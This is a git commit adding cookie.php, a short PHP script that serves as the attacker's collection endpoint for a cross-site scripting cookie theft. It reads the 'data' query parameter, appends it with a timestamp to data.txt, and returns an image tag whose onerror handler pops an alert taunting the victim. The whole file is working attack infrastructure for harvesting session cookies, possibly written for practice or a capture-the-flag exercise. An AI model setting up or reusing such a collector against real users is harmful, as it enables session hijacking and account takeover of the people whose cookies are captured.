441f9d61ba8331d9f357a8d5e31857d327d52e06
Wantgohome <70064195+Wantgohome@users.noreply.github.com>
2021-11-08 23:25:09 +0900

    Create cookie.php

---
+++ cookie.php
@@ -0,0 +1,10 @@
+<?
+
+$cookie=$_GET['data'];
+$atime=date("y-m-d H:i:s");
+$log=fopen("data.txt","a");
+fwrite($log,$atime." ".$cookie."\r\n");
+fclose($log);
+echo "<img src=\'0\' onerror=alert(\"daniel takes your cookie\")></img>";
+
+?>
